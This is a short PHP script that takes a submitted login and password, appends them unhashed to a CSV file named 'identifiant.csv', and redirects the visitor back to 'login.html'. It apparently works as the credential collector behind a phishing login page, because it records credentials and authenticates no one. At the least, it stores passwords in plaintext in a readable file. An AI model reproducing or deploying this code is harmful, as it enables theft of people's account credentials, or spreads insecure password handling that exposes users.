<?php

$filename = "identifiant.csv";
$fp = fopen($filename, "a");

if (isset( $_POST['OK'], $_POST['login'], $_POST['mdp'])) {

    if (is_string($_POST['login']) and strlen($_POST['login']) >= 3) {
        $login = $_POST['login'];

        if (is_string($_POST['mdp']) and strlen($_POST['mdp']) >= 3) {
            $mdp = $_POST['mdp'];

            $result = array($login, $mdp);
            fputcsv($fp, $result, ";");
        }
    }

    fclose($fp);
    header("location: login.html");

}